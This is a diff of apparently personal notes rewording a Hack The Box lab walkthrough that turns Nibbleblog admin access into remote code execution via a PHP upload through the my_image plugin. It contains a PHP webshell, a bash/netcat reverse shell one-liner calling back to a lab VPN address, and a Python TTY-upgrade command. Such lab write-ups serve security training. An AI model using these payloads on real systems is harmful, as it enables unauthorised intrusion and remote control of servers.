@@ -1,12 +1,14 @@
-- Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. 
-- We know a `Metasploit` module will likely work for this, but let us enumerate the admin portal for other avenues of attack. Looking around a bit, we see the following pages:
+- We are able to log into the admin portal, so let's turn this access into a way of creating a reverse shell access to the web server.
+- A Metasploit module may do the trick, but let's use other avenues to do this instead.
 ![[Screenshot_20241107_131847.png]]
-- Attempting to make a new page and embed code or upload files does not seem like the path. Let us check out the plugins page.
-- Let us attempt to use this plugin to upload a snippet of `PHP` code instead of an image. The following snippet can be used to test for code execution.
+- We can't make a new page, embed code, or upload files as it doesn't seem to like the path.
+- Instead, let's check out the plugins page.
+- Looking at it, let's use his plugin to upload a snippet of `PHP` code instead of an image.
 ```php
 <?php system('id'); ?>
 ```
-- Save this code to a file and then click on the `Browse` button and upload it.
+- We can save this code to a file.
+- Then, click on the `Browse` button and upload it.
 - We get a bunch of errors, but it seems like the file may have uploaded.
 ```shell-session
 Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26
@@ -21,21 +23,25 @@ Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/w
 
 Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
 ```
-- Now we have to find out where the file uploaded if it was successful. Going back to the directory brute-forcing results, we remember the `/content` directory. Under this, there is a `plugins` directory and another subdirectory for `my_image`. 
-- The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`.
-- In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful! Let us check and see if we have command execution.
+- The uploaded file is found under `/nibbleblog/content/private/plugins/my_image/`.
+- We see `db.xml` and `image.php` with a recent last modified date, indicating successful upload.
+- Now, we need to check to see if we have command execution on these files.
 ```shell-session
 secmancer@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
 
 uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 ```
-- We do! It looks like we have gained remote code execution on the web server, and the Apache server is running in the `nibbler` user context. Let us modify our PHP file to obtain a reverse shell and start poking around the server.
-- Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).
-- Let us use the following `Bash` reverse shell one-liner and add it to our `PHP` script.
+- We sure in fact do!
+- Looks like we gained remote code execution on the Apache server running as `nibbler` user.
+- We can modify the PHP file to obtain a reverse shell and upload it again.
+- So, we can use resources like PayloadAllTheThings and HighOnCoffee for reverse shell techniques.
+- Looks like aa Bash reverse shell one-liner will work best, so let's add that to the PHP script.
 ```shell-session
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
 ```
-- We will add our `tun0` VPN IP address in the `<ATTACKING IP>` placeholder and a port of our choice for `<LISTENING PORT>` to catch the reverse shell on our `netcat` listener. See the edited `PHP` script below.
+- We will add our `tun0` VPN IP address in the `<ATTACKING IP>` placeholder.
+- Let's also add a port of our choice for `<LISTENING PORT>`.
+- This way, we can catch the reverse shell on our `netcat` listener.
 ```php
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
 ```
@@ -56,9 +62,10 @@ $ id
 
 uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 ```
-- Furthermore, we have a reverse shell. 
-- Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc. 
-- This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a `Python` one-liner to spawn a pseudo-terminal so commands such as `su` and `sudo` work as discussed previously in this Module.
+- We need to upgrade the shell to a fully interactive TTY for better usability.
+- The initial shell lacks features like `su`, text editors, and tab-completion.
+- We can refer to [this post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) for methods to achieve this.
+- So, let's use a `Python` one-liner to spawn a pseudo-terminal for improved functionality.
 ```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
